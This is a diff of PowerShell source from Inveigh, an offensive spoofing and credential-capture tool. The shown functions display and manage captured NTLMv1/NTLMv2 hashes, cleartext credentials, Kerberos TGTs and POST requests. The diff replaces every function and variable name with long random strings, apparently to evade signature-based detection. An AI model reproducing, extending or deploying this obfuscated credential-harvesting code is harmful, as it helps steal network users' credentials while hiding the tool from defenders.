+                    foreach($ywtkoKPpjQFRzREpCWXMBjTrXz in $XodGYFMYieIKSKzQFeSRHeqsASwRoUtaarAXT)
                     {
-                        Write-TableSteam($UnableLove + $LightOval.newline)
+                        Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha($ywtkoKPpjQFRzREpCWXMBjTrXz + $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.newline)
                     }
 
                     Start-Sleep -m 5
                 }
                 else
                 {
-                    Write-TableSteam("[+] [$(Get-Date -format s)] No NTLMv1 challenge/response hashes have been captured" + $LightOval.newline)
+                    Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha("[+] [$(Get-Date -format s)] No NTLMv1 challenge/response hashes have been captured" + $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.newline)
                 }
 
-                if($LightOval.NTLMv2_list.Count -gt 0)
+                if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NTLMv2_list.Count -gt 0)
                 {
-                    Write-TableSteam("[*] [$(Get-Date -format s)] Current unique NTLMv2 challenge/response captures:" + $LightOval.newline)
-                    $LightOval.NTLMv2_list.Sort()
-                    $EdgeSide = $LightOval.NTLMv2_list
+                    Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha("[*] [$(Get-Date -format s)] Current unique NTLMv2 challenge/response captures:" + $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.newline)
+                    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NTLMv2_list.Sort()
+                    $GFgUaexBTRzBRiwqzOtnAQqtuslK = $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NTLMv2_list
 
-                    foreach($BrakeSoap in $EdgeSide)
+                    foreach($DronQpzrzZZbQXaILLSSvFRVYeahSqUOKKTLiRzI in $GFgUaexBTRzBRiwqzOtnAQqtuslK)
                     {
-                        $GustyScared = $BrakeSoap.SubString(0,$BrakeSoap.IndexOf(":",($BrakeSoap.IndexOf(":") + 2)))
+                        $CkyAtwhjrtQiODfbENilyuSHTFH = $DronQpzrzZZbQXaILLSSvFRVYeahSqUOKKTLiRzI.SubString(0,$DronQpzrzZZbQXaILLSSvFRVYeahSqUOKKTLiRzI.IndexOf(":",($DronQpzrzZZbQXaILLSSvFRVYeahSqUOKKTLiRzI.IndexOf(":") + 2)))
 
-                        if($GustyScared -ne $OilDrop)
+                        if($CkyAtwhjrtQiODfbENilyuSHTFH -ne $PbFVkfKxlINuWsNzLLXeaHkgJqRJtjTeKTeSF)
                         {
-                            Write-TableSteam($BrakeSoap + $LightOval.newline)
+                            Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha($DronQpzrzZZbQXaILLSSvFRVYeahSqUOKKTLiRzI + $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.newline)
                         }
 
-                        $OilDrop = $GustyScared
+                        $PbFVkfKxlINuWsNzLLXeaHkgJqRJtjTeKTeSF = $CkyAtwhjrtQiODfbENilyuSHTFH
                     }
 
-                    $OilDrop = ''
+                    $PbFVkfKxlINuWsNzLLXeaHkgJqRJtjTeKTeSF = ''
                     Start-Sleep -m 5
-                    Write-TableSteam("[*] [$(Get-Date -format s)] Current NTLMv2 IP addresses and usernames:" + $LightOval.newline)
-                    $RiddleAttach = $LightOval.NTLMv2_username_list
+                    Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha("[*] [$(Get-Date -format s)] Current NTLMv2 IP addresses and usernames:" + $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.newline)
+                    $oyHmLtZHwVmBrpZYPEAtJXbZndbCDBUWdJYbsdDavKLng = $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NTLMv2_username_list
 
-                    foreach($HousesFire in $RiddleAttach)
+                    foreach($KxoSIiMWcKdaNuYBNjbKBMmEKUtEKgLkjkkkowVyk in $oyHmLtZHwVmBrpZYPEAtJXbZndbCDBUWdJYbsdDavKLng)
                     {
-                        Write-TableSteam($HousesFire + $LightOval.newline)
+                        Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha($KxoSIiMWcKdaNuYBNjbKBMmEKUtEKgLkjkkkowVyk + $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.newline)
                     }
                 
                 }
                 else
                 {
-                    Write-TableSteam("[+] [$(Get-Date -format s)] No NTLMv2 challenge/response hashes have been captured" + $LightOval.newline)
+                    Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha("[+] [$(Get-Date -format s)] No NTLMv2 challenge/response hashes have been captured" + $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.newline)
                 }
 
-                $EggsBike = [System.Diagnostics.Stopwatch]::StartNew()
+                $VPFWKWaCfwaFChVPMofeFmLAUhloJRWMsr = [System.Diagnostics.Stopwatch]::StartNew()
             }
 
-            if($LightOval.console_input)
+            if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_input)
             {
 
                 if([Console]::KeyAvailable)
                 {
-                    $LightOval.console_output = $false
+                    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_output = $false
                     BREAK console_loop
                 }
         
@@ -5993,9 +5993,9 @@ try
 finally
 {
 
-    if($BaseBright -eq 2)
+    if($hGjKncthoprHSEMgsWUxrXKWoBIZybkBY -eq 2)
     {
-        $LightOval.running = $false
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.running = $false
     }
 
 }
@@ -6003,82 +6003,82 @@ finally
 }
 # Microsoft".
 # Microsoft".
-function Stop-LightOval
+function Stop-sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV
 {
 
-    if($LightOval)
+    if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV)
     {
-        $LightOval.stop = $true
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.stop = $true
         
-        if($LightOval.running -or $LightOval.relay_running)
+        if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.running -or $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.relay_running)
         {
-            $LightOval.console_queue.Clear()
-            Watch-LightOval -FitTrade
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_queue.Clear()
+            Watch-sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV -QhdLvHKxhVYEEePVIMpdRxtLNpGboXGOABeFehYkGc
         }
         else
         {
-            Write-TableSteam "[-] There are no running Inveigh functions"
+            Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha "[-] There are no running Inveigh functions"
         }
 
     }
 
 }
 
-function Get-LightOval
+function Get-sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV
 {
 
     [CmdletBinding()]
     param
     ( 
-        [parameter(Mandatory=$false)][Switch]$AskEffect,
-        [parameter(Mandatory=$false)][Switch]$ProseBrake,
-        [parameter(Mandatory=$false)][Switch]$StarGreedy,
-        [parameter(Mandatory=$false)][Switch]$TourManage,
-        [parameter(Mandatory=$false)][Switch]$PumpCuddly,
-        [parameter(Mandatory=$false)][Int]$TinClassy,
-        [parameter(Mandatory=$false)][Switch]$MissAlert,
-        [parameter(Mandatory=$false)][Switch]$CrownShort,
-        [parameter(Mandatory=$false)][Switch]$BatAfraid,
-        [parameter(Mandatory=$false)][Switch]$MarketJuggle,
-        [parameter(Mandatory=$false)][Switch]$WishMetal,
-        [parameter(Mandatory=$false)][Switch]$ScrewOffend,
-        [parameter(Mandatory=$false)][Switch]$WormHug,
-        [parameter(Mandatory=$false)][Switch]$ActInsect,
-        [parameter(Mandatory=$false)][Switch]$CubCall,
-        [parameter(Mandatory=$false)][Switch]$UncleJuice,
-        [parameter(Mandatory=$false)][Switch]$FixedRabbit,
-        [parameter(Mandatory=$false)][Switch]$RejectFast,
-        [parameter(Mandatory=$false)][Switch]$FoldDam,
-        [parameter(ValueFromRemainingArguments=$true)]$TongueShrug
+        [parameter(Mandatory=$false)][Switch]$AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF,
+        [parameter(Mandatory=$false)][Switch]$iDEfJmQItyhFjizDwcSAZTROmoggBFFjGweFeRMchZ,
+        [parameter(Mandatory=$false)][Switch]$iFOpOnUPRUTNiDvxodopkMTvyRrE,
+        [parameter(Mandatory=$false)][Switch]$LKZKomsGsEUsPOllMavnB,
+        [parameter(Mandatory=$false)][Switch]$DVOqrGUTxpUfmqukYoVbsesmfUlg,
+        [parameter(Mandatory=$false)][Int]$HAnKlCqJqYLOOKjjSaVOtTzhianvqjZnFv,
+        [parameter(Mandatory=$false)][Switch]$sPIHhOQhuvXHJfmvJszplRLRaTxkciSuFNOjMkeogW,
+        [parameter(Mandatory=$false)][Switch]$lKtYTgfIktoUQpRnSzfsBYLTQKdZwPDD,
+        [parameter(Mandatory=$false)][Switch]$idhIIRDfEXQkKYMkXyGYOQlLudM,
+        [parameter(Mandatory=$false)][Switch]$kjvPVCdFXuxSuyUrLYKXNGfiFNSGTLrUegmqtfkuLYrT,
+        [parameter(Mandatory=$false)][Switch]$wrjRNTpkoQfiiqptAqvnnh,
+        [parameter(Mandatory=$false)][Switch]$seCdBRxWUkasfSdAGSvIkPuMgkiCdeQrLtLucl,
+        [parameter(Mandatory=$false)][Switch]$VyEdBMrXfOaYGrTfbKoUyeJdqbunrXzNShxiEAqONtEAy,
+        [parameter(Mandatory=$false)][Switch]$XmSKqZJGJpBhcjioqkZECfrLdsciJDtEdDyPUm,
+        [parameter(Mandatory=$false)][Switch]$RrcwpHYLCoDIbrmAkcfvfJuuBaLGF,
+        [parameter(Mandatory=$false)][Switch]$phusiuXHWRPtmzDNPSRKGLtrHEmOWijPnGqFON,
+        [parameter(Mandatory=$false)][Switch]$lUlulTIIeaiobpyVtUlLkEnSBMy,
+        [parameter(Mandatory=$false)][Switch]$RCwIBkMHHWDnJkpbTUzbmnVUjDkqM,
+        [parameter(Mandatory=$false)][Switch]$pcAjVRUHdxmzxrQcKuVZM,
+        [parameter(ValueFromRemainingArguments=$true)]$jpNTCIxGJBVtjEdXzPhc
     )
 
-    if($StarGreedy -or $WickedRare.Count -eq 0)
+    if($iFOpOnUPRUTNiDvxodopkMTvyRrE -or $eIfNtyVLQymnQThpxABZe.Count -eq 0)
     {
 
-        while($LightOval.console_queue.Count -gt 0)
+        while($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_queue.Count -gt 0)
         {
 
-            if($LightOval.output_stream_only)
+            if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_stream_only)
             {
-                Write-TableSteam($LightOval.console_queue[0] + $LightOval.newline)
-                $LightOval.console_queue.RemoveAt(0)
+                Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_queue[0] + $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.newline)
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_queue.RemoveAt(0)
             }
             else
             {
 
-                switch -wildcard ($LightOval.console_queue[0])
+                switch -wildcard ($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_queue[0])
                 {
 
                     {$_ -like "?`[`!`]*" -or $_ -like "?`[-`]*"}
                     {
-                        Write-Warning $LightOval.console_queue[0]
-                        $LightOval.console_queue.RemoveAt(0)
+                        Write-Warning $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_queue[0]
+                        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_queue.RemoveAt(0)
                     }
 
                     default
                     {
-                        Write-TableSteam $LightOval.console_queue[0]
-                        $LightOval.console_queue.RemoveAt(0)
+                        Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_queue[0]
+                        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_queue.RemoveAt(0)
                     }
 
                 }
@@ -6089,229 +6089,229 @@ function Get-LightOval
 
     }
 
-    if($TourManage)
+    if($LKZKomsGsEUsPOllMavnB)
     {
-        $BaseDapper = $LightOval.ADIDNS_table.Keys
+        $ZnDEbMvBkazmPVmZeClxgWGZlJSuTfUIYDyNuLz = $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.ADIDNS_table.Keys
 
-        foreach($KnottyHelp in $BaseDapper)
+        foreach($iSFFbNmIfHTyxYEeSsanYn in $ZnDEbMvBkazmPVmZeClxgWGZlJSuTfUIYDyNuLz)
         {
             
-            if($LightOval.ADIDNS_table.$KnottyHelp -ge 1)
+            if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.ADIDNS_table.$iSFFbNmIfHTyxYEeSsanYn -ge 1)
             {
-                Write-TableSteam $KnottyHelp
+                Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha $iSFFbNmIfHTyxYEeSsanYn
             }
 
         }
 
     }
 
-    if($PumpCuddly)
+    if($DVOqrGUTxpUfmqukYoVbsesmfUlg)
     {
 
-        $BaseDapper = $LightOval.ADIDNS_table.Keys
+        $ZnDEbMvBkazmPVmZeClxgWGZlJSuTfUIYDyNuLz = $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.ADIDNS_table.Keys
 
-        foreach($KnottyHelp in $BaseDapper)
+        foreach($iSFFbNmIfHTyxYEeSsanYn in $ZnDEbMvBkazmPVmZeClxgWGZlJSuTfUIYDyNuLz)
         {
             
-            if($LightOval.ADIDNS_table.$KnottyHelp -eq 0)
+            if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.ADIDNS_table.$iSFFbNmIfHTyxYEeSsanYn -eq 0)
             {
-                Write-TableSteam $KnottyHelp
+                Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha $iSFFbNmIfHTyxYEeSsanYn
             }
 
         }
 
     }
 
-    if($TinClassy)
+    if($HAnKlCqJqYLOOKjjSaVOtTzhianvqjZnFv)
     {
-        Write-TableSteam $LightOval.kerberos_TGT_list[$TinClassy]
+        Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.kerberos_TGT_list[$HAnKlCqJqYLOOKjjSaVOtTzhianvqjZnFv]
     }
 
-    if($MissAlert)
+    if($sPIHhOQhuvXHJfmvJszplRLRaTxkciSuFNOjMkeogW)
     {
-        Write-TableSteam $LightOval.kerberos_TGT_username_list
+        Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.kerberos_TGT_username_list
     }
 
-    if($BatAfraid)
+    if($idhIIRDfEXQkKYMkXyGYOQlLudM)
     {
-        Write-TableSteam $LightOval.log
+        Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.log
     }
 
-    if($MarketJuggle)
+    if($kjvPVCdFXuxSuyUrLYKXNGfiFNSGTLrUegmqtfkuLYrT)
     {
-        Write-TableSteam $LightOval.NTLMv1_list
+        Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NTLMv1_list
     }
 
-    if($ScrewOffend)
+    if($seCdBRxWUkasfSdAGSvIkPuMgkiCdeQrLtLucl)
     {
-        $LightOval.NTLMv1_list.Sort()
-        $RayGlue = $LightOval.NTLMv1_list
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NTLMv1_list.Sort()
+        $TvEiFbIRXpDMpynGTiAMZtAAqlLdJzfKP = $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NTLMv1_list
 
-        foreach($BattleHover in $RayGlue)
+        foreach($KBNZEXuHLANtSyOWHcZUKjtynrbnZq in $TvEiFbIRXpDMpynGTiAMZtAAqlLdJzfKP)
         {
-            $PlaceDonkey = $BattleHover.SubString(0,$BattleHover.IndexOf(":",($BattleHover.IndexOf(":") + 2)))
+            $IIzQgkUKVvGXCzPbONJGZGQWuGupKgU = $KBNZEXuHLANtSyOWHcZUKjtynrbnZq.SubString(0,$KBNZEXuHLANtSyOWHcZUKjtynrbnZq.IndexOf(":",($KBNZEXuHLANtSyOWHcZUKjtynrbnZq.IndexOf(":") + 2)))
 
-            if($PlaceDonkey -ne $LooseStop)
+            if($IIzQgkUKVvGXCzPbONJGZGQWuGupKgU -ne $tmJkdNbZulSifPCahBYASLPSoqGmM)
             {
-                Write-TableSteam $BattleHover
+                Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha $KBNZEXuHLANtSyOWHcZUKjtynrbnZq
             }
 
-            $LooseStop = $PlaceDonkey
+            $tmJkdNbZulSifPCahBYASLPSoqGmM = $IIzQgkUKVvGXCzPbONJGZGQWuGupKgU
         }
 
     }
 
-    if($ActInsect)
+    if($XmSKqZJGJpBhcjioqkZECfrLdsciJDtEdDyPUm)
     {
-        Write-TableSteam $LightOval.NTLMv2_username_list
+        Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NTLMv2_username_list
     }
 
-    if($WishMetal)
+    if($wrjRNTpkoQfiiqptAqvnnh)
     {
-        Write-TableSteam $LightOval.NTLMv2_list
+        Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NTLMv2_list
     }
 
-    if($WormHug)
+    if($VyEdBMrXfOaYGrTfbKoUyeJdqbunrXzNShxiEAqONtEAy)
     {
-        $LightOval.NTLMv2_list.Sort()
-        $EdgeSide = $LightOval.NTLMv2_list
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NTLMv2_list.Sort()
+        $GFgUaexBTRzBRiwqzOtnAQqtuslK = $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NTLMv2_list
 
-        foreach($BrakeSoap in $EdgeSide)
+        foreach($DronQpzrzZZbQXaILLSSvFRVYeahSqUOKKTLiRzI in $GFgUaexBTRzBRiwqzOtnAQqtuslK)
         {
-            $GustyScared = $BrakeSoap.SubString(0,$BrakeSoap.IndexOf(":",($BrakeSoap.IndexOf(":") + 2)))
+            $CkyAtwhjrtQiODfbENilyuSHTFH = $DronQpzrzZZbQXaILLSSvFRVYeahSqUOKKTLiRzI.SubString(0,$DronQpzrzZZbQXaILLSSvFRVYeahSqUOKKTLiRzI.IndexOf(":",($DronQpzrzZZbQXaILLSSvFRVYeahSqUOKKTLiRzI.IndexOf(":") + 2)))
 
-            if($GustyScared -ne $OilDrop)
+            if($CkyAtwhjrtQiODfbENilyuSHTFH -ne $PbFVkfKxlINuWsNzLLXeaHkgJqRJtjTeKTeSF)
             {
-                Write-TableSteam $BrakeSoap
+                Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha $DronQpzrzZZbQXaILLSSvFRVYeahSqUOKKTLiRzI
             }
 
-            $OilDrop = $GustyScared
+            $PbFVkfKxlINuWsNzLLXeaHkgJqRJtjTeKTeSF = $CkyAtwhjrtQiODfbENilyuSHTFH
         }
 
     }
 
-    if($CubCall)
+    if($RrcwpHYLCoDIbrmAkcfvfJuuBaLGF)
     {
-        Write-TableSteam $LightOval.NTLMv2_username_list
+        Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NTLMv2_username_list
     }
 
-    if($AskEffect)
+    if($AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF)
     {
-        Write-TableSteam $LightOval.cleartext_list
+        Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.cleartext_list
     }
 
-    if($ProseBrake)
+    if($iDEfJmQItyhFjizDwcSAZTROmoggBFFjGweFeRMchZ)
     {
-        Write-TableSteam $LightOval.cleartext_list | Get-Unique
+        Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.cleartext_list | Get-Unique
     }
 
-    if($UncleJuice)
+    if($phusiuXHWRPtmzDNPSRKGLtrHEmOWijPnGqFON)
     {
-        Write-TableSteam $LightOval.POST_request_list
+        Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.POST_request_list
     }
 
-    if($FixedRabbit)
+    if($lUlulTIIeaiobpyVtUlLkEnSBMy)
     {
-        Write-TableSteam $LightOval.POST_request_list | Get-Unique
+        Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.POST_request_list | Get-Unique
     }
 
-    if($CrownShort)
+    if($lKtYTgfIktoUQpRnSzfsBYLTQKdZwPDD)
     {
-        Write-TableSteam $LightOval.valid_host_list
+        Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.valid_host_list
     }
 
-    if($RejectFast)
+    if($RCwIBkMHHWDnJkpbTUzbmnVUjDkqM)
     {
-        $ColorReply = 0
+        $vfvDllDKJdYKKWFSzYEB = 0
 
-        while($ColorReply -lt $LightOval.session_socket_table.Count)
+        while($vfvDllDKJdYKKWFSzYEB -lt $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.session_socket_table.Count)
         {
 
-            if(!$LightOval.session_socket_table[$ColorReply].Connected)
+            if(!$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.session_socket_table[$vfvDllDKJdYKKWFSzYEB].Connected)
             {
-                $LightOval.session[$ColorReply] | Where-Object {$_.Status = "disconnected"}
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.session[$vfvDllDKJdYKKWFSzYEB] | Where-Object {$_.Status = "disconnected"}
             }
         
-            $ColorReply++
+            $vfvDllDKJdYKKWFSzYEB++
         }
 
-        Write-TableSteam $LightOval.session | Format-Table -AutoSize
+        Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.session | Format-Table -AutoSize
     }
 
-    if($FoldDam)
+    if($pcAjVRUHdxmzxrQcKuVZM)
     {
-        Write-TableSteam $LightOval.enumerate
+        Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.enumerate
     }
 
 }
 
-function Watch-LightOval
+function Watch-sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV
 {
 
 [CmdletBinding()]
 param
 ( 
-    [parameter(Mandatory=$false)][Switch]$FitTrade,
-    [parameter(Mandatory=$false)][ValidateSet("Low","Medium","Y")][String]$RottenBed = "Y",
-    [parameter(ValueFromRemainingArguments=$true)]$TongueShrug
+    [parameter(Mandatory=$false)][Switch]$QhdLvHKxhVYEEePVIMpdRxtLNpGboXGOABeFehYkGc,
+    [parameter(Mandatory=$false)][ValidateSet("Low","Medium","Y")][String]$lkPcWVVpLUCgsOzshxhpoRVCsIGIIciiEFTOCbSPYBG = "Y",
+    [parameter(ValueFromRemainingArguments=$true)]$jpNTCIxGJBVtjEdXzPhc
 )
 
-if($LightOval.tool -ne 1)
+if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.tool -ne 1)
 {
 
-    if($LightOval.running -or $LightOval.relay_running)
+    if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.running -or $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.relay_running)
     {
         
-        if(!$FitTrade)
+        if(!$QhdLvHKxhVYEEePVIMpdRxtLNpGboXGOABeFehYkGc)
         {
-            Write-TableSteam "[*] Press any key to stop console output"
+            Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha "[*] Press any key to stop console output"
         }
 
-        $LightOval.console_output = $true
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_output = $true
 
-        :console_loop while((($LightOval.running -or $LightOval.relay_running) -and $LightOval.console_output) -or ($LightOval.console_queue.Count -gt 0 -and $LightOval.console_output))
+        :console_loop while((($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.running -or $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.relay_running) -and $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_output) -or ($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_queue.Count -gt 0 -and $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_output))
         {
 
-            while($LightOval.console_queue.Count -gt 0)
+            while($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_queue.Count -gt 0)
             {
 
-                switch -wildcard ($LightOval.console_queue[0])
+                switch -wildcard ($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_queue[0])
                 {
 
                     {$_ -like "?`[`!`]*" -or $_ -like "?`[-`]*"}
                     {
-                        Write-Warning $LightOval.console_queue[0]
-                        $LightOval.console_queue.RemoveAt(0)
+                        Write-Warning $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_queue[0]
+                        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_queue.RemoveAt(0)
                     }
 
                     {$_ -like "*spoofer disabled]" -or $_ -like "*local request]" -or $_ -like "* host header *" -or $_ -like "* user agent received *"}
                     {
 
-                        if($RottenBed -eq 'Y')
+                        if($lkPcWVVpLUCgsOzshxhpoRVCsIGIIciiEFTOCbSPYBG -eq 'Y')
                         {
-                            Write-TableSteam $LightOval.console_queue[0]
+                            Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_queue[0]
                         }
 
-                        $LightOval.console_queue.RemoveAt(0)
+                        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_queue.RemoveAt(0)
 
                     } 
 
                     {$_ -like "*response sent]" -or $_ -like "*ignoring*" -or $_ -like "* HTTP*request for *" -or $_ -like "* Proxy*request for *" -or $_ -like "*SYN packet*"}
                     {
                     
-                        if($RottenBed -ne "Low")
+                        if($lkPcWVVpLUCgsOzshxhpoRVCsIGIIciiEFTOCbSPYBG -ne "Low")
                         {
-                            Write-TableSteam $LightOval.console_queue[0]
+                            Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_queue[0]
                         }
 
-                        $LightOval.console_queue.RemoveAt(0)
+                        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_queue.RemoveAt(0)
 
                     } 
 
                     default
                     {
-                        Write-TableSteam $LightOval.console_queue[0]
-                        $LightOval.console_queue.RemoveAt(0)
+                        Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_queue[0]
+                        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_queue.RemoveAt(0)
                     }
 
                 } 
@@ -6320,7 +6320,7 @@ if($LightOval.tool -ne 1)
 
             if([Console]::KeyAvailable)
             {
-                $LightOval.console_output = $false
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_output = $false
                 BREAK console_loop
             }
 
@@ -6330,147 +6330,147 @@ if($LightOval.tool -ne 1)
     }
     else
     {
-        Write-TableSteam "[-] Inveigh isn't running"
+        Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha "[-] Inveigh isn't running"
     }
 
 }
 else
 {
-    Write-TableSteam "[-] Watch-LightOval cannot be used with current external tool selection"
+    Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha "[-] Watch-sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV cannot be used with current external tool selection"
 }
 
 }
 
-function Clear-LightOval
+function Clear-sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV
 {
 
-if($LightOval)
+if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV)
 {
 
-    if(!$LightOval.running -and !$LightOval.relay_running)
+    if(!$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.running -and !$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.relay_running)
     {
         Remove-Variable inveigh -scope global
-        Write-TableSteam "[+] Inveigh data has been cleared from memory"
+        Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha "[+] Inveigh data has been cleared from memory"
     }
     else
     {
-        Write-TableSteam "[-] Run Stop-LightOval before running Clear-LightOval"
+        Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha "[-] Run Stop-sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV before running Clear-sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV"
     }
 
 }
 
 }
 
-function ConvertTo-LightOval
+function ConvertTo-sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV
 {
 
     [CmdletBinding()]
     param
     ( 
-        [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$BusyPast,
-        [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$RainyShave,
-        [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$RoughGate,
-        [parameter(Mandatory=$false)][Switch]$HomelyShow,
-        [parameter(ValueFromRemainingArguments=$true)]$TongueShrug
+        [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$gHcWGQeWpoQpqgGoWjJMdKlHyiArjUjB,
+        [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$JRPFnfKvazFOZaFuyEmuboVRJBxuGr,
+        [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$AVUNSSWtBzyEwbWvxRjMGOZYBlz,
+        [parameter(Mandatory=$false)][Switch]$tPEylzZKZOmcrNuZqaNvxfEfrUAkL,
+        [parameter(ValueFromRemainingArguments=$true)]$jpNTCIxGJBVtjEdXzPhc
     )
 
-    if(!$BusyPast -and !$RainyShave -and !$RoughGate)
